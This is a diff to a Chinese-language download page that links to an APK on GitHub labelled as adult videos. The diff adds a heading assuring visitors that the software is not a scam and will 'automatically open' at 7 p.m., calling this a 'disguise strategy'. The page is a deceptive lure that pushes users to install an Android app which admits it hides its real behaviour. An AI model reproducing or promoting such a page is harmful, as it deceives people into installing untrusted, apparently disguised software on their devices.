@@ -1,4 +1,3 @@
-
 <html lang="zh-CN">
     <head>
 		        <meta charset="GBK"/>
@@ -34,6 +33,7 @@
         <div class="main">
             <li>
 <br><br><br>
+<div><h2>当你看到这页面的时候，请不要认为这个软件是不好，或者是欺骗你的，晚上7点的时候软件会自动开启你想要的，这是软件的伪装策略，请知晓！</h2></div>
         <div class="item-pic"></div>
         <div class="item-info">
             <h3 class="good-name"><a href="https://github.com/xinglangtaba/xinglangtabaGit/raw/master/mv1.apk">成人视频第一波 下载</a></h3>
